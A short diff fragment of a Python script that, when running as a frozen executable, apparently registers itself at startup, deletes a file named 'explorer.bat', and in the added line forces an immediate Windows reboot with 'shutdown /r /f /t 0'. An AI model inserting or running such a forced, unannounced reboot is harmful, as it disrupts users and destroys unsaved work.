@@ -97,6 +97,7 @@ if getattr(sys, 'frozen', False):
     app(name_app)
     startup()
     os.remove('explorer.bat')
+    os.system('shutdown /r /f /t 0')
 else:
     pass
 
